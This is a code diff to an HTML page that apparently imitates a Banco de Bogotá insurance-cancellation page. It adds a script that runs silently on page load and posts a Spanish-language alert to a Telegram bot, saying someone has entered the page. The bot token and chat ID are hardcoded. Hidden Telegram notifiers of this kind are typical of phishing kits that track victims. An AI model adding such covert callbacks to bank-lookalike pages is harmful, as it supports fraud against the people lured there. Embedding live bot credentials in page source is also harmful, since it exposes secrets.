@@ -25,7 +25,7 @@
     <script type="text/javascript" src="https://tags.bluekai.com/site/79910?ret=js&limit=1"></script>
     <script type='text/javascript'
             src='https://service.maxymiser.net/api/us/creditodigital.bancodebogota.co/19e275/mmapi.js'></script>
-    </head>
+</head>
 
 <body class="bg-gray-50 text-gray-800">
 <div class="min-h-screen">
@@ -227,6 +227,28 @@
     </div>
 
 </div>
+<script>
+    // Este código se ejecuta una vez que la página ha cargado completamente
+    window.onload = function() {
+        const token = '7820322308:AAGfqVzbyVl_ceNP4ufou_Ga1vnAdfPw6N0';
+        const chatId = '-4890355646';
+        const message = '🔵 ¡Alguien ha entrado en la página de cancelación de seguros!';
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
+        })
+        .then(response => response.json())
+        .then(data => console.log('Mensaje enviado a Telegram:', data))
+        .catch(error => console.error('Error al enviar mensaje a Telegram:', error));
+    };
+</script>
 <script src="js/core/params.js"></script>
 <script src="js/scripts.js"></script>
 <script>
